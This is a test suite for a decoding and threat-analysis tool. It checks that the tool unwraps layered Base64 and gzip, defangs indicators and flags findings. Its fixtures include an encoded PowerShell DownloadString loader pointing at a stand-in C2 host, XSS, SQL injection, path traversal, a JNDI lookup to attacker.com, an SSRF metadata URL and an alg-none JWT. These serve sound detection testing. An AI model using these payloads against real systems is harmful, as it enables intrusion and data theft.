import { describe, expect, it } from 'vitest';
import { analyse, flatten, toMarkdown } from './index';

/**
 * A payload shaped the way real ones are: Base64 over Base64 over gzip over
 * JSON, with the interesting parts — an encoded PowerShell loader, a C2 URL and
 * a cloud key — sitting in fields four layers down.
 *
 * Nothing in this is visible to a tool that greps the original blob, which is
 * the whole reason the analyser exists.
 */
const LAYERED =
  'SDRzSUFBQUFBQUFBQ2hYTnpXNkNRQUJGNFZjaHN5NXFXazBOaVlzei9FbEZLYkVtYlhjSUU2QWlUQ3AyYkp1K2V6UEw4eTN1L1JYbHVSS2UwSU5SbjVkR2RaM2o5b04yWE9NMGJWV3AzbkZWWHpyN1hFWkVOUWtNaEhQZWMvbUFQK1BGeUpaNHNQM0JPaWRCWnNRSEtyZ1NsZFpid2kxSHBMWityT1VNLzBSYXk1QjRTV1hrbGRod05MSWh6amtZT1dPZFVPVFdTemJRRTlkVVdJZXM1Z3QveVRablFaQ1ExdHdJM3Nqc1h4RGFYaENjU08yZVA2ZEUvbGgvTW1oWXJjU2RLTytGSjVweDFONTBlaTY2dG15SDY4VlZ0K0tzT3pVWkJ6MnRpMUZOZEtQRm5UaXBiK0VKTmdsSnRvK3lZTGQ3REYvWlBxZWgrUHNIQ3o5RSt6c0JBQUE9';

describe('analysis', () => {
  it('unwraps every layer and reaches the payload', async () => {
    const result = await analyse(LAYERED);
    const nodes = flatten(result.root);
    const formats = nodes.map((node) => node.format);

    expect(formats).toContain('Base64');
    expect(formats).toContain('gzip');
    expect(result.maxDepth).toBeGreaterThanOrEqual(3);

    // The JSON body is reached: Base64 → Base64 → gzip.
    expect(nodes.some((node) => node.output.includes('malicious-example'))).toBe(true);

    // And then it keeps going. The PowerShell command is Base64 of UTF-16LE
    // sitting in one *field* of that JSON, so reaching it means the explorer
    // went into the structure rather than stopping at it. Linear unwrapping
    // ends at the JSON and never sees this.
    const deepest = nodes.sort((a, b) => b.depth - a.depth)[0];
    expect(deepest?.output).toContain('DownloadString');
    expect(deepest?.depth).toBeGreaterThanOrEqual(6);

    // That branch exists only because a region *inside* a node was followed.
    expect(
      nodes.some((node) => node.origin !== undefined),
      'no branch came from an embedded region',
    ).toBe(true);
  });

  it('finds indicators that only exist several layers down', async () => {
    const result = await analyse(LAYERED);
    const values = result.indicators.map((i) => i.value);

    expect(values.some((v) => v.includes('malicious-example.top'))).toBe(true);
    expect(result.indicators.some((i) => i.kind === 'url')).toBe(true);

    // Every indicator names the path that revealed it, or the report is useless.
    for (const indicator of result.indicators) {
      expect(indicator.path.length).toBeGreaterThan(0);
      expect(indicator.depth).toBeGreaterThanOrEqual(0);
    }
  });

  it('defangs indicators so a report is safe to paste', async () => {
    const result = await analyse(LAYERED);
    const url = result.indicators.find((i) => i.kind === 'url');

    expect(url?.defanged).not.toContain('http://');
    expect(url?.defanged).toContain('hxxp');
    expect(url?.defanged).not.toContain('.top');
    expect(url?.defanged).toContain('[.]');
  });

  it('raises the security findings the content justifies', async () => {
    const result = await analyse(LAYERED);
    const ids = result.findings.map((f) => f.id);

    expect(ids, 'the cloud credential was missed').toContain('cloud-credential');
    expect(ids, 'the encoded PowerShell was missed').toContain('powershell-encoded');
    expect(ids, 'the nesting depth was not flagged').toContain('deep-nesting');

    // Ordered by severity, so the worst thing is the first thing read.
    expect(result.findings[0]?.severity).toBe('critical');
  });

  it('gives every finding something a person can act on', async () => {
    const result = await analyse(LAYERED);
    for (const finding of result.findings) {
      expect(finding.title.length, `${finding.id} has no title`).toBeGreaterThan(5);
      expect(finding.detail.length, `${finding.id} has a thin explanation`).toBeGreaterThan(40);
      expect(finding.evidence.length, `${finding.id} cites no evidence`).toBeGreaterThan(0);
      expect(finding.path.length).toBeGreaterThan(0);
    }
  });

  it('finds a payload embedded in one field of a larger structure', async () => {
    // The Base64 sits inside a JSON body, not around it. A linear unwrapper
    // decodes the JSON and stops; this has to go into the field.
    const secret = 'the exfil host is 203.0.113.44 and the operator is root@example.org';
    const body = JSON.stringify({
      id: 1042,
      status: 'ok',
      note: 'nothing to see',
      blob: Buffer.from(secret).toString('base64'),
    });

    const result = await analyse(body);
    const outputs = flatten(result.root).map((n) => n.output);

    expect(outputs.some((o) => o.includes('exfil host'))).toBe(true);
    expect(result.indicators.some((i) => i.value === '203.0.113.44')).toBe(true);
    expect(result.indicators.some((i) => i.kind === 'email')).toBe(true);

    // And it records that the branch came from inside the parent.
    expect(flatten(result.root).some((n) => n.origin !== undefined)).toBe(true);
  });

  it('detects the classic web attack payloads once decoded', async () => {
    const cases: Array<[string, string]> = [
      ['%3Cscript%3Ealert(1)%3C%2Fscript%3E', 'xss-payload'],
      ["%27%20OR%20%271%27%3D%271%20--%20", 'sql-injection'],
      ['%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'path-traversal'],
      ['JHtqbmRpOmxkYXA6Ly9hdHRhY2tlci5jb20vYX0=', 'jndi-injection'],
      ['aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhLw==', 'ssrf-metadata'],
    ];

    for (const [input, expected] of cases) {
      const result = await analyse(input);
      expect(
        result.findings.map((f) => f.id),
        `missed ${expected} in ${input.slice(0, 32)}`,
      ).toContain(expected);
    }
  });

  it('flags a JWT that asks not to be verified', async () => {
    // {"alg":"none","typ":"JWT"} with an admin claim.
    const token =
      'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwiYWRtaW4iOnRydWV9.';
    const result = await analyse(token);
    expect(result.findings.map((f) => f.id)).toContain('jwt-alg-none');
    expect(result.findings.find((f) => f.id === 'jwt-alg-none')?.severity).toBe('critical');
  });

  it('stays quiet on ordinary content', async () => {
    const result = await analyse(
      'The deployment failed twice last night and nobody was paged about it.',
    );
    // No findings above informational, and nothing invented.
    expect(result.findings.filter((f) => f.severity !== 'info')).toEqual([]);
    expect(result.maxDepth).toBe(0);
  });

  it('stays inside its budget on adversarial input', async () => {
    // Deliberately recursive: Base64 of Base64 of Base64, twenty times over.
    let payload = 'the innermost secret';
    for (let i = 0; i < 20; i++) payload = Buffer.from(payload).toString('base64');

    const started = Date.now();
    const result = await analyse(payload, { maxNodes: 24, budgetMs: 1500 });

    expect(Date.now() - started).toBeLessThan(6000);
    expect(result.nodes).toBeLessThanOrEqual(25);
  });

  it('produces a report that is safe to paste into a ticket', async () => {
    const markdown = toMarkdown(await analyse(LAYERED));

    expect(markdown).toContain('# DecodeBox analysis');
    expect(markdown).toContain('## Findings');
    expect(markdown).toContain('## Indicators');
    // Live links must never survive into the report.
    expect(markdown).not.toContain('http://malicious-example.top');
    expect(markdown).toContain('hxxp');
  });

  it('handles empty and hostile input without throwing', async () => {
    for (const input of ['', '   ', '\0\0\0', 'a'.repeat(20000), '💣']) {
      const result = await analyse(input, { budgetMs: 800 });
      expect(result.root).toBeDefined();
      expect(Array.isArray(result.findings)).toBe(true);
      expect(Array.isArray(result.indicators)).toBe(true);
    }
  }, 30000);
});
